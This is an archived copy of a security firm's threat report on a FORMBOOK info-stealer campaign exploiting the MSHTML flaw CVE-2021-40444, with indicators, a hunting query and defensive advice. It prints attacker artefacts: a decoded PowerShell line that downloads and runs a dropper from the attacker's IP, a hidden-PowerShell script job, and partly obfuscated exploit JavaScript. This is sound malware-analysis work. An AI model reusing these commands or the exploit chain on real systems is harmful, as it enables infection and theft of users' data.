{
    "id": "ea5c5073-759b-4a33-bd2f-f28767d47e81",
    "created_at": "2023-01-12T15:03:12.715553Z",
    "updated_at": "2025-03-27T02:08:41.294397Z",
    "deleted_at": null,
    "sha1_hash": "2de51bab9ac81f2a1ac0cbd297a32a1f66117744",
    "title": "2022-01-18 - FORMBOOK Adopts CAB-less Approach",
    "authors": "",
    "file_creation_date": "2022-05-27T23:20:56Z",
    "file_modification_date": "2022-05-27T23:20:56Z",
    "file_size": 6088680,
    "plain_text": "# FORMBOOK Adopts CAB-less Approach\n\n**[elastic.github.io/security-research/intelligence/2022/01/01.formbook-adopts-cabless-approach/article/](https://elastic.github.io/security-research/intelligence/2022/01/01.formbook-adopts-cabless-approach/article/)**\n\n[FORMBOOK](https://elastic.github.io/security-research/tags/#formbook) [Malware](https://elastic.github.io/security-research/tags/#malware) [Phishing](https://elastic.github.io/security-research/tags/#phishing) [CVE-2021-40444](https://elastic.github.io/security-research/tags/#cve-2021-40444)\n\n\n-----\n\n2022-01-18\n\n\n-----\n\nThe Elastic Intelligence & Analytics team is tracking a new FORMBOOK information stealing campaign leveraging the\n[MSHTML remote code exploit (CVE-2021-40444). This campaign has been observed sharing infrastructure between the](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)\n[Weaponization phases of both the testing and production releases.](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)\n\nWe have observed, and will discuss, three phases of this campaign relevant to defenders:\n\nTesting phase using CVE-2021-40444\nProduction phase using CVE-2021-40444\nGeneric phase without CVE-2021-40444\n\nAs of November 8, 2021, Elastic observed network infrastructure actively being used to deploy the FORMBOOK information\nstealer and acting as a command and control endpoint serving archives, implants, and scripts leveraged throughout the\ncampaign variations.\n\nShout Out\n\nWe wanted to call out some great adjacent research from the team as Sophoslabs Uncut that was released on December 21,\n2021. Research groups frequently analyze similar, or in this case, the same campaigns through their lens. This is fantastic as\nit gets more eyes, from different perspectives, onto the same problem. If you’re looking for more information, please check\n[out their research over on their blog.](https://news.sophos.com/en-us/2021/12/21/attackers-test-cab-less-40444-exploit-in-a-dry-run/)\n\n## Key Takeaways¶\n\nThe speed at which vulnerability PoC’s are being released highlights the need to leverage threat hunting to identify\npost-exploitation events before patches can be applied\nA FORMBOOK campaign was observed combining infrastructure that allowed testing and production phases to be\nlinked together\nPatching for the MSHTML exploit appears to be effective as the campaign shifted from attempting to use the exploit to a\ntraditional phishing malware-attachment approach\nThe campaign required a multi-process attack chain to load a DLL file onto victim systems\n\n[On September 7, 2021, Microsoft confirmed a vulnerability for the browser rendering engine used in several applications such](https://nvd.nist.gov/vuln/detail/CVE-2021-40444)\n[as those within the Microsoft Office suite. Within three days [1] [2], proof-of-concept code was released, highlighting the](https://twitter.com/vxunderground/status/1436326057179860992?s=20)\nmaturity of the exploit development ecosystem and underscoring the importance of proactive threat hunting and patch\nmanagement strategies.\n\nBased on telemetry, we observed this exploit used in conjunction with the FORMBOOK information stealer. We also identified\nan adversary tradecraft oversight that led to us connecting what appeared to be campaign testing infrastructure and a\nFORMBOOK phishing campaign targeting manufacturing victims with global footprints.\n\nThis post details the tactics, techniques, and procedures (TTPs) of this campaign. Our goal is to enable detection capabilities\nfor security practitioners using the Elastic Stack and any readers concerned with the CVE-2021-40444 vulnerability or\ncampaigns related to FORMBOOK.\n\n## Details¶\n\n[When Microsoft disclosed a vulnerability in the browser rendering engine used by multiple Microsoft Office products, proof-of-](https://nvd.nist.gov/vuln/detail/CVE-2021-40444)\nconcept code was released within three days. This allowed defenders to observe how the exploit operated and to develop\n[countermeasures to defend their networks while patches and mitigating workarounds could be deployed [1], [2], [3], [4], [5],](https://github.com/aslitsecurity/CVE-2021-40444_builders)\n\n[[6].](https://twitter.com/vxunderground/status/1436326057179860992?s=20)\n\nAdditionally, this highlights the maturity of the exploit development community — underscoring the importance of proactive\nmeasures (like network and endpoint monitoring, anti-spam/phishing countermeasures, email MIME-type attachment policies,\netc.) and an exercised patch management strategy.\n\nAt a high level, an attacker could craft a malicious ActiveX control to be used by a Microsoft Office document that will allow\nfor code to be remotely executed on a victim machine. While this vulnerability is well documented, security researcher\n[Edubr2020 did a](https://twitter.com/Edu_Braun_0day) [fantastic job of explaining how the exploit works in a default configuration, as well as a more clever](https://github.com/Edubr2020/CVE-2021-40444--CABless)\n“CABless” approach. Our telemetry observed both the default configuration and the CABless approach. We describe these in\ndetail below\n\n\n-----\n\nWe initiated several collection techniques simultaneously, including searching for malicious attachments that would be\nincluded in phishing emails — one of the most common mechanisms for distributing exploit code. We noticed that not many\nmalicious email attachments had been reported, and by October 28, 2021, we were only able to identify four instances of this\nexploit leveraged with email. In addition to the four instances of the exploit, we observed the threat actor attempting to\nleverage a generic phishing approach with the FORMBOOK malware as an attachment.\n\nThe next following sections will break down these different campaign sightings and their respective details:\n\nTesting\nProduction\nGeneric\n\nImportant\n\nThroughout the Details section, it is important to note a few things that are required for this attack chain to function,\nirrespective of the Testing or Production phases\n\n1. A major challenge for the campaign is to get a DLL file onto the victim system\n2. ActiveX controls are DLL files with special constraints\n3. Web pages can link ActiveX controls directly or load files that are contained in a URL — this is not recommended by\n\n_Microsoft because file signatures cannot be validated_\n\n### Testing phase¶\n\nThe first sighting contained an email with a single attachment with a sender of `admin0011[@]issratech.com . While`\nresearching that email address, we discovered this email address associated with additional malicious samples in VirusTotal.\nThe email observed in this phase included a single attachment called `Request Details.docx .`\n\n\n-----\n\nEmail attachments are stored as Base64 encoded strings in the email. To extract the `Request Details.docx email`\nattachment, we can use the `echo command to send the Base64 encoded string to` `STDOUT, pipe it to the` `base64`\nprogram, and save it as `email-attachment so that we can analyze it.`\n\nDecoding the email attachment\n```\n$ echo \"UEsDBBQAAAAIAFCELVO0gTweZgEAAIgFAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbLVUyWrDMBC9F/oPRtdgK+...truncated...\" \\\n  | base64 -D -o email-attachment\n\n```\n**Request Details.docx¶**\n\nThe `file command is a standard Unix and Unix-like program for identifying a file type. Running the` `file command,`\nverified that this was a Microsoft Word document:\n\nVerifying the email attachment file type\nMicrosoft Office documents, post-2007, are compressed archives. To dig into the document without opening it, you can\ndecompress the file using the “unzip” command as illustrated above.\n\nWithin the document relationship file ( word/_rels/document.xml.rels ), we can view metadata about how different\nelements of the document are related to each other.\n\nEmail attachment relationship document\n\n\n-----\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n...truncated...\n<Relationship Id=\"rId6\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\"\nTarget=\"MHTML:&#x48;&#x54;&#x54;&#x50;&#x3a;&#x5c;&#x5c;&#x31;&#x30;&#x34;&#x2e;&#x32;&#x34;&#x34;&#x2e;&#x37;&#x38;\n  &#x31;&#x37;&#x37;&#x5c;&#x50;&#x6f;&#x70;&#x65;&#x2e;&#x74;&#x78;&#x74;&#x21\" TargetMode=\"External\"/>\n...truncated\n</Relationships>\n\n```\n[From here, we can see an externally linked MHTML OLE object inside an element using HTML entities, which reserve](https://www.w3schools.com/html/html_entities.asp)\ncharacters in HTML. HTML entities are natively not human readable, so they need to be decoded. Using the data analyzer\n[and decoder from the United Kingdom’s Government Communications Headquarters (GCHQ), CyberChef, we were able to](https://gchq.github.io/CyberChef/)\nquickly decode the HTML entities with the “From HTML Entity” recipe (CyberChef recipes are pre-configured data parsers\nand decoders).\n\nThe decoded HTML entity was `HTTP:\\\\104[.]244[.]78[.]177\\Pope.txt . This provided us with another atomic indicator`\nto add to the `admin0011[@]issratech.com email address we’d previously collected,` `104[.]244[.]78[.]177 .`\nAdditionally, the decoded HTML entity revealed another file that could be of interest, `Pope.txt .`\n\n**Pope.txt¶**\n\nWe retrieved a copy of `Pope.txt from` `104[.]244[.]78[.]177 and observed that it contained JavaScript code using`\nvariable renaming and string obfuscation. This JavaScript performs the following functions:\n\nDownloads a Cabinet archive file called `comres.cab from the same IP address but fails to extract it`\n[Creates several ActiveX objects (which are executable applications or libraries) to be loaded into the browser rendering](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/automat/activex-objects)\nengine\nUses the CVE-2021-40444 vulnerability with the ActiveX objects to perform directory traversal and execute a file called\n\n`IEcache.inf . This filename is the DLL loader from the` [ASL IT Security PoC code and doesn’t exist in this test run](https://github.com/aslitsecurity/CVE-2021-40444_builders/blob/main/CVE-2021-40444/IEcache.inf)\n\n\n-----\n\nThe above figure shows the notable section of the obfuscated JavaScript code. We used a debugger to parse out the results\nof the lookup functions (shown commented out with `// ‘s). This revealed the` `classid ( CLSID:edbc374c-5730-432a-`\n```\nb5b8-de94f0b57217 ) attribute which appears across the web in various other malware analyses of CVE-2021-40444. This\n\n```\nsuggests with moderate confidence that this JavaScript was crafted using some repurposed code that has been opensourced. The `classid attribute is used to determine if` `comres.cab has already been downloaded — if it has, it won’t`\nattempt to download it again.\n\nOnce `comres.cab is downloaded and extracted, the extracted file must be located. This is why there are multiple directory`\nexecution attempts observed in JavaScript. All the work up to this point is to get the DLL ( IEcache.inf ) onto the filesystem.\nFinally, the DLL file would be executed as a control panel file ( .cpl ), because control panel files can be loaded as DLLs.\n\n\n-----\n\n**Comres.cab and 1.doc.inf¶**\n\nIn our sample, `comres.cab does not include the ASL IT Security PoC DLL ( IEcache.inf ). It included a file called`\n```\n1.doc.inf .\n\n```\nFrom `comres.cab we used the file archive utility, 7-Zip, to extract` `1.doc.inf . This file is interesting because it has the`\n\n`.inf` [(setup information file) extension, but in using the](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/overview-of-inf-files) `file command, we can see that it is actually a DLL file, meaning`\nthat the file type is being obfuscated.\n\nCollecting 1.doc.inf from comres.cab\n\n\n-----\n\n```\n7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28\np7zip Version 17.04 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,16 CPUs x64)\nScanning the drive for archives:\n1 file, 6060053 bytes (5919 KiB)\nExtracting archive: comres.cab\n-Path = comres.cab\nType = Cab\nPhysical Size = 6060053\nMethod = None\nBlocks = 1\nVolumes = 1\nVolume Index = 0\nID = 1234\nEverything is Ok\nSize:    4465152\nCompressed: 6060053\n$ file 1.doc.inf\n1.doc.inf: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n```\n[When analyzing the import address table (IAT) of](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table) `1.doc.inf, we observed multiple API functions, which would allow the`\nfile to download and execute additional files. Of particular note were the `ShellExecuteExA and` `URLDownloadToFileW API`\nfunctions.\n\n1.doc.inf import table\n```\n=== IMPORTS ===\nMODULE_NAME   HINT  ORD FUNCTION_NAME\nbcrypt.dll     0    BCryptSetProperty\n          0    GetKeyState\nADVAPI32.dll    0    RegDeleteKeyW\nSHELL32.dll     0    ShellExecuteExA\nurlmon.dll     0    URLDownloadToFileW\nWS2_32.dll        9\nole32.dll      0    CoInitializeSecurity\nNETAPI32.dll    0    NetLocalGroupAddMembers\nOLEAUT32.dll       8\nPSAPI.DLL      0    GetModuleFileNameExW\n          0    WTSSendMessageW\n          0    GetProcessWindowStation\n          0    LocalAlloc\n          0    GetModuleFileNameW\n          0    GetProcessAffinityMask\n          0    SetProcessAffinityMask\n          0    SetThreadAffinityMask\n          0    Sleep\n          0    ExitProcess\n          0    FreeLibrary\n          0    LoadLibraryA\n          0    GetModuleHandleA\n          0    GetProcAddress\n          0    GetProcessWindowStation\n          0    GetUserObjectInformationW\n\n```\n[Through further analysis of the DLLs sections list, we identified that the file was protected with VMProtect (identified by the](https://vmpsoft.com/)\n```\n.vmp0, .vmp1, .vmp2, .vmp3 sections). “VMProtect protects code by executing it on a virtual machine with non\n```\nstandard architecture that makes it extremely difficult to analyze.”\n\nViewing the sections of 1.doc.inf\n\n\n-----\n\n```\n p p | {p,,, }\n=== SECTIONS ===\nNAME  RVA  VSZ  RAW_SZ\n.text  1000  12ecd 0\n.rdata 14000 49ce  0\n.data  19000 1350d8 0\n.vmp1  14f000 2c70  0\n.vmp0  152000 fac  0\n.bss  153000 1000  0\n.vmp2  154000 38c0bb 0\n.vmp3  4e1000 5c6720 5c6800\n.reloc aa8000 5b4  600\n\n```\nAs we were unable to analyze the VMProtected file, we continued to explore other information that we’d previously collected.\nSpecifically, we searched for additional samples that had been sent using the same `admin0011[@]issratech.com email`\naddress. These parallel analyses identified additional samples and campaign phases, which we’re referring to as the\nProduction and Generic phases.\n\n### Production phase¶\n\nThe second, third, and fourth sightings all had the same sender field of `admin0011[@]issratech.com and included a single`\nattachment — `Profile.rar file — to deliver the second stage malware.`\n\n**Profile.rar¶**\n\nPreviously, we’ve highlighted files that have an extension that differs from their actual file type. To validate that the attachment\nis a RAR archive, we again use the `file command to validate that it is a RAR archive.`\n\nVerifying email attachment file type\n```\n$ file Profile.rar\nProfile.rar: data\n\n```\n\n-----\n\nThe attachment has a RAR file extension, but instead of having a file type of `RAR archive data, v5, it is raw` `data .`\nAnalysts who discover a file containing raw data can use the `less command to dump the file contents to` `STDOUT to`\ndirectly inspect what may be inside.\n\nProfile.rar dumped to STDOUT\n```\n$ less Profile.rar\n<job><script language=vbs>Set WshShell = WScript.CreateObject(\"WScript.Shell\")\nrunCmd = \"POwErshell -noprofile -noni -W Hidden -enc\naQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBs\nWshShell.Run \"cmd /c \" & runCmd, 0, True</script></job> Rar!...truncated...\n\n```\nThe raw data includes a script job element that can be natively interpreted by the Windows Script Host (WSH). The job\nelement directs WSH to spawn a shell that spawns a hidden PowerShell process which then runs a Base64 encoded\nPowerShell script. However, the script job element needs to be executed, which isn’t done by double-clicking on the file.\n\nDecoding this string, we can see that a file called `abb01.exe is downloaded and executed from` `104[.]244[.]78[.]177 .`\nThis is the same IP address we have observed across all Testing and Production phases.\n\nDecoded PowerShell command\n```\necho\n\"aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgB\n | base64 -D\n\n```\n```powershell title=”Resulting powershell output (defanged) iex ((new-object\nsystem.net.webclient).downloadfile(“http://104[.]244[.]78[.]177/abb01.exe”,”$env:LOCALAPPDATA\\dllhostSvc.exe”));StartProcess “$env:LOCALAPPDATA\\dllhostSvc.exe”\n```\nWe'll continue to explore this file to identify how the script job is executed. As we displayed above, the file\nstill\nhas the `Rar!` header, so we can decompress this archive. First, we'll use the `unrar` program to decompress the\nRAR\narchive and retrieve the contents: `document.docx`.\n```shell title=\"Decompressing Profile.rar\"\n$ unrar e Profile.rar\nExtracting from Profile.rar\nExtracting document.docx                       OK\nAll OK\n\n```\n**document.docx¶**\n\nWhile `Profile.rar appears to be a compressed archive, the PowerShell script won’t download and execute` `abb01.exe`\nautomatically upon decompressing it. To execute that script, the compressed document within `Profile.rar,`\n```\ndocument.docx, must be opened.\n\n```\nUsing the same technique as we highlighted in the Testing phase, we decompressed `document.docx and examined the`\ndocument relationship file ( word/_rels/document.xml.rels ). As previously described, we observed a remote OLE object\nstored and formatted as an HTML entity code block that we can decode using CyberChef.\n\n\n-----\n\nWe see the same IP address, `104[.]244[.]78[.]177 and a new filename called` `Profile.html .`\n\n**Profile.html¶**\n\nBased on the HTML code, this initially appeared to be an Apache landing page. However, closer inspection identified another\nobfuscated JavaScript towards the bottom of the page.\n\nProfile.html and the obfuscated JavaScript\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\"><head>\n<meta content=\"text/html; charset=UTF-8\" http-equiv=\"Content-Type\" />\n<!-    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n        This file is generated from xml source: DO NOT EDIT\n    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n    -->\n<title>Getting Started - Apache HTTP Server Version 2.5</title>\n...truncated…\n<script>function a(){var l=['wexcKvyUWOi','ntu3ndaWmeHNC0HOsq','nfPrsujOwG','amohWRqfW5xcNSk/r23cO8kClG','\niSkfW5hcTSk4jmk4xmk2W73dSCkjWOq','ndCXnZeXDLf1tKLj','WRSYCcCZzmkmaW','WQzEqb5xWOldVWXBgSkSWRyp','AhrTBgzPBgu',\n'W5tdO1L3WOFdISk8W50','u2nYAxb0','lNDZzJOUlI8UlI8UlI9ezxnRDg9Wl1bYB2zPBguUCMfYpY53C2y','iCkEW592W77cNa',\n'WReLW5ddJGiJWRhcRMuYW40LW4v9xSkJWRNcObFdLSkEW5hcMe1kW4JcHL84W7WgWPtcNt4eW4NcP8oZy8kN',\n'lNDZzJOUlI8UlI9eB3DUBg9HzhmVuhjVzMLSzs5Yyxi/lNDZzG','ndaWmtu5BvbZqxHH','Bg9JyxrPB24',\n'ex3cTSkNW5z+w2RcKGhdLs/dNbBdImoknSk1FwVdQL/cVSkWWRC9WPldO3/dRLv5lt5lW4XFWRVcGWxcNsiX','nZa3mZKWnNP1zffirq',\n'bxy1yvlcHujyqSkly2ldHvDrW5vJW7HQW5mZimkKWPJcQJClD0j3WO5SW6KTqmozaWOzACoc','mtKXmZq5mLbREgPOqW','W73dMrjjW53cQaBcVq'\n...truncated…\nActiveXObject(j(0x144))[k(0x13c,'k0X5')][j(0x14c)]=k(0x14d,'[Otp'),new ActiveXObject('htmlfile')[j(0x146)]\n['location']=j(0x14a),new ActiveXObject('htmlfile')[k(0x148,\n'MCjf')][k(0x138,'kZYE')]=j(0x147),new ActiveXObject(j(0x144))[j(0x146)][k(0x142,'Lz1J')]=k(0x14f,'BiKg'),new\nActiveXObject(k(0x145,'h]@1'))[j(0x146)][j(0x14c)]=k(0x13a,'!v$V'));</s\ncript>\n\n```\nDeobfuscating the JavaScript using the same debugger as before, we can see several ActiveXObjects. This time, however,\nthere are far fewer and the execution is more prescripted, eliminating useless calls. This shows a refinement from before.\nThis newer code also uses a `.wsf extension instead of the previous` `.cpl . This allows the exploit to use the Windows`\nScripting Host to execute code. This is the same directory traversal technique we observed in the Testing phase. However,\nthis time the JavaScript is looking for the `Profile.rar file (whereas in the Testing phase, it was looking for`\n```\nIECache.inf) and attempting to execute the PowerShell script, which was prepended in Profile.rar as a Windows\n\n```\nScript File ( .wsf ).\n\n**Dropper¶**\n\nAs we illustrated above, `Profile.rar has a prepended Base64 encoded PowerShell command which downloads`\n```\nabb01.exe . The JavaScript from Profile.html attempts to execute this PowerShell code within Profile.rar as a\n\n```\nWindows Script File.\n\n\n-----\n\n```\nabb01.exe is a dropper that when dynamically executed, drops another PE file, yxojzzvhi0.exe in our example.\n\n```\n**FORMBOOK Binary¶**\n```\nyxojzzvhi0.exe was scanned with Elastic YARA rules and identified to be a variant of FORMBOOK, based on unique byte\n\n```\nsequences.\n\nFORMBOOK, also known as XLOADER, is an information stealer that includes keyloggers, clipboard copiers, and form\ngrabber components to collect and exfiltrate sensitive information. This malware has been offered as-a-service for over\nfiveyears and remains a successful tool for stealing information.\n\n### Generic phase¶\n\nOn October 28 and November 8, 2021, we observed additional sightings but used a generic phishing attachment tactic to\nload FORMBOOK. Additionally, we were able to collect some information from the email header that we’ll discuss in the\nCampaign Analysis section.\n\nThese sightings all have two RAR attachments. One of the attachments has a `.rar file extension and the other has either a`\n```\n.gz or .7z extension. We’ll explore one of the sightings below.\n\n```\nVerifying file types of the email attachments\n\n\n-----\n\n```\n          g\nD2110-095.gz: RAR archive data, v5\nDWG.rar:   RAR archive data, v5\n\n```\n[The RAR files contained two PE files. They were identical instances of a very common FORMBOOK variant.](https://www.virustotal.com/gui/file/4216ff4fa7533209a6e50c6f05c5216b8afb456e6a3ab6b65ed9fcbdbd275096/detection)\n\nHashing FORMBOOK\n\n## Campaign analysis¶\n\nWhile researching this FORMBOOK campaign, we observed infrastructure reuse and tooling similarities during testing and\noperational phases, which we believe represent a single campaign.\n\n\n-----\n\nAll artifacts will be provided at the end of this report.\n\n### Email header¶\n\nThroughout all sightings, the campaign used similar sending email addresses:\n\n\n-----\n\n```\nadmin0011[@]issratech.com\n\n```\n\nAdditionally, across the Production and Generic phases of the campaign, we observed the X-Mailer element (the software\nidentifier set by the sending email client) as `RainLoop/1.16.0 . RainLoop is an open-source email client. It should be noted`\nthat in our collection, one sighting had some header information sanitized before being uploaded to VirusTotal. RainLoop\ncould have been referenced in this sighting, but we were not able to confirm that.\n\n### File hashes¶\n\nAcross the Production phase, we were able to identify code sharing through the use of the same attachment\n( Profile.rar ).\n\n### IP addresses¶\n\nAcross the Testing and Production phases, we observed that `104[.]244[.]78[.]177 was used for all elements of the`\ncampaigns. This IP address was used to host archives, implants, and scripts.\n\n### Resource development¶\n\nAs research progressed, we observed activities we believed were capability testing. This activity was observed one time and\nused artifacts ( [IEcache.inf](https://github.com/aslitsecurity/CVE-2021-40444_builders/blob/main/CVE```\n2021-40444/IEcache.inf), [document.xml.rels](https://raw.githubusercontent.com/aslitsecurity/CVE-202140444_builders/main/CVE-2021-40444/source/doc/word/_rels/document.xml.rels) ) from a public CVE-2021-40444\n\n```\n[exploit proof-of-concept repository. Other phases included custom exploit code that differed from the PoC code but shared](https://github.com/aslitsecurity/CVE-2021-40444_builders)\n[initial access and](https://attack.mitre.org/techniques/T1566/001) [execution TTPs as well as the same network infrastructure.](https://attack.mitre.org/techniques/T1203)\n\nWe observed that the `issratech[.]com,` `backsjoy[.]com, and` `leoeni[.]com domains own TLS certificates provided`\nby Let’s Encrypt. While the steps of creating a TLS certificate are not overly cumbersome, the fact that the domain owner\nwent through the preparatory process of creating a certificate could indicate that these domains are intended to be used for\nfuture encrypted operations.\n\nIn the Generic phase, the campaign abandoned the MSHTML exploit and attempted to leverage a traditional phishing\nmalware-attachment approach. This shift in tactics is possibly because successful exploit patching rendered the vulnerability\nineffective.\n\n### Victimology¶\n\nWe observed that of the four companies targeted by this campaign, all were in the manufacturing vertical. Threat actors\n[utilizing FORMBOOK have been observed targeting the manufacturing vertical in the past. The companies all had](https://threatpost.com/formbook-malware-targets-us-defense-contractors-aerospace-and-manufacturing-sectors/128334/)\ninternational footprints in:\n\nIndustrial Materials, Aluminum extrusion, HQ in Germany (Testing phase)\nIndustrial Conglomerate, Industrial Chemicals, HQ in South Korea (Production phase)\nIndustrial Manufacturing Products and Consulting, HQ in Switzerland (Generic phase)\nIndustrial Mechanical Engineering and Manufacturing, HQ in Germany (Generic phase)\n\nWhile the targeted companies are of note (in that they are in the same vertical), an email address domain observed in all\nthree phases — `issratech[.]com, appears similar to a legitimate Jamaican company domain,` `isratech[.]com, a`\nbusiness that specializes in irrigation, wastewater management, and solar energy. Below, is a screenshot of\n```\nissratech[.]com using the default CyberPanel landing page. CyberPanel is a web hosting tool for WordPress sites.\n\n```\n\n-----\n\nEach targeted company of the `admin0011[@]issratech.com email address have expertise or products that could have`\nbeen valuable to an Isratch project listed on their projects page (https://www.isratech[.]com/projects/):\n\nChemical: Waste-water treatment, dairy production sanitation\nExtruded aluminum: Solar array scaffolding, greenhouses\n\nTwo additional email address domains were observed in the Generic phase — one appears to be mimicking a legitimate\nmedical equipment manufacturer ( backjoy[.]com ) and the other ( leonei[.]com ) appears to be adversary controlled, but\nseemingly not being used for legitimate purposes.\n\nNote\n\n**Note:** `leonei[.]com is protected by a Denial-of-Service protection service, so their domain IP address likely represents`\nmultiple legitimate domains and any blocking of the `leonei[.]com IP address from the indicator table should be carefully`\nmeasured.\n\nIt is possible, but not confirmed, that the recipients of the phishing emails in all phases are from a list of email addresses in\nthe manufacturing vertical. These email lists are commonly available for purchase to enable sales, marketing, and businessto-business (B2B) efforts but can also be used for phishing campaigns.\n\n## Tactics¶\n\nUsing the MITRE ATT&CK® framework, tactics represent the why of a technique or sub technique. It is the adversary’s\ntactical goal: the reason for performing an action.\n\nObserved tactics:\n\nResource development\n\n\n-----\n\nInitial access\nExecution\n\n### Techniques / Sub techniques¶\n\nTechniques and Sub techniques represent how an adversary achieves a tactical goal by performing an action.\n\nObserved techniques/sub techniques\n\nAcquire infrastructure - server\nObtain capabilities - malware and exploits\nStage capabilities - upload malware\nPhishing - attachment\nCommand and scripting interpreter - PowerShell\nExploitation for client execution\n\n## Detection¶\n\n### Hunting queries¶\n\nThese queries can be used in Kibana’s Security → Timelines → New Timeline → Correlation query editor. While these\nqueries will identify this intrusion set, they can also identify other events of note that, once investigated, could lead to other\nmalicious activities.\n\nThis query will identify the CVE-2021-40444 exploit attempt from a malicious Access, Publisher, PowerPoint, or Word\ndocument.\n\nHunt query identifying the CVE-2021-40444 exploit\n```\nprocess where event.type in (\"start\", \"process_started\") and\n  process.parent.name : (\"eqnedt32.exe\", \"excel.exe\", \"fltldr.exe\", \"msaccess.exe\", \"mspub.exe\",\n    \"powerpnt.exe\", \"winword.exe\") and\n  process.command_line :\n      (\"*../../..*\",\n      \"*..\\\\..\\\\*\",\n      \"*cpl:..*\",\n      \"*hta:..*\",\n      \"*js:..*\",\n      \"*jse:..*\",\n      \"*sct:..*\",\n      \"*vbs:..*\",\n      \"*wsf:..*\")\n\n```\n\n-----\n\n### YARA¶\n\nWe have created a YARA rule to identify this FORMBOOK activity.\n\n## Defensive Recommendations¶\n\nThe following steps can be leveraged to improve a network’s protective posture:\n\n1. Review and implement the above detection logic within your environment using technology such as Sysmon and the\n\nElastic Endpoint or Winlogbeat\n2. Review and ensure that you have deployed the latest Microsoft Security Updates\n3. Maintain backups of your critical systems to aid in quick recovery\n\n## References¶\n\nThe following research was referenced throughout the document:\n\n## Indicators¶\n\nWe will post all the indicators in the form of a STIX 2.1 JSON document soon.\n\n\n**Indicator** **Type**\n\n\n**Reference**\n**from blog** **Note**\n\n\n`70defbb4b846868ba5c74a526405f2271ab71de01b24fbe2d6db2c7035f8a7df` SHA256 Request\nDocument.docx\n\n\nTesting phase\nemail\nattachment\n\n\n`7c98db2063c96082021708472e1afb81f3e54fe6a4a8b8516e22b3746e65433b` SHA256 comres.cab Testing phase\nCAB archive\n\n`363837d5c41ea6b2ff6f6184d817c704e0dc5749e45968a3bc4e45ad5cf028d7` SHA256 1.doc.inf Testing phase\nVMProtect\nDLL\n\n`22cffbcad42363841d01cc7fef290511c0531aa2b4c9ca33656cc4aef315e723` SHA256 IEcache.inf Testing phase\nDLL loader\n\n\n-----\n\n**Indicator** **Type**\n\n\n**Reference**\n**from blog** **Note**\n\n\n`e2ab6aab7e79a2b46232af87fcf3393a4fd8c4c5a207f06fd63846a75e190992` SHA256 Pope.txt Testing phase\nJavaScript\n\n`170eaccdac3c2d6e1777c38d61742ad531d6adbef3b8b031ebbbd6bc89b9add6` SHA256 Profile.rar Production\nphase email\nattachment\n\n`d346b50bf9df7db09363b9227874b8a3c4aafd6648d813e2c59c36b9b4c3fa72` SHA256 document.docx Production\nphase\ncompressed\ndocument\n\n`776df245d497af81c0e57fb7ef763c8b08a623ea044da9d79aa3b381192f70e2` SHA256 abb01.exe Production\nphase dropper\n\n`95e03836d604737f092d5534e68216f7c3ef82f529b5980e3145266d42392a82` SHA256 Profile.html Production\nphase\nJavaScript\n\n`bd1c1900ac1a6c7a9f52034618fed74b93acbc33332890e7d738a1d90cbc2126` SHA256 yxojzzvhi0.exe FORMBOOK\nmalware\n\n`0c560d0a7f18b46f9d750e24667721ee123ddd8379246dde968270df1f823881` SHA256 DWG.rar Generic phase\nemail\nattachment\n\n`5a1ef64e27a8a77b13229b684c09b45a521fd6d4a16fdb843044945f12bb20e1` SHA256 D2110-095.gz Generic phase\nemail\nattachment\n\n\n`4216ff4fa7533209a6e50c6f05c5216b8afb456e6a3ab6b65ed9fcbdbd275096` SHA256 D2110-095.exe\nDWG.exe\n\n`admin0011[@]issratech.com` emailaddr\n\n`admin010[@]backsjoy.com` emailaddr\n\n`admin012[@]leoeni.com` emailaddr\n\n`issratech[.]com` domainname\n\n`backsjoy[.]com` domainname\n\n`leonei[.]com` domainname\n\n`2[.]56[.]59[.]105` ipv4addr\n\n`212[.]192[.]241[.]173` ipv4addr\n\n`52[.]128[.]23[.]153` ipv4addr\n\n\nFORMBOOK\nmalware\n\nPhishing\nsending email\naddress\n\nPhishing\nsending email\naddress\n\nPhishing\nsending email\naddress\n\nAdversary\ncontrolled\ndomain\n\nAdversary\ncontrolled\ndomain\n\nAdversary\ncontrolled\ndomain\n\nIP address of\nissratech[.]com\n\nIP address of\nbacksjoy[.]com\n\nIP address of\nleonei[.]com\n\n\n-----\n\n**Indicator** **Type**\n\n`104[.]244[.]78[.]177` ipv4addr\n\n## Artifacts¶\n\n\n**Reference**\n**from blog** **Note**\n\nAdversary\ncontrolled IP\naddress\n\n\nArtifacts are also available for download in both ECS and STIX format in a combined zip bundle.\n\n[Download indicators.zip](https://elastic.github.io/security-research/intelligence/2022/01/01.formbook-adopts-cabless-approach/indicators.zip)\n\nLast update: February 2, 2022\nCreated: January 19, 2022\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
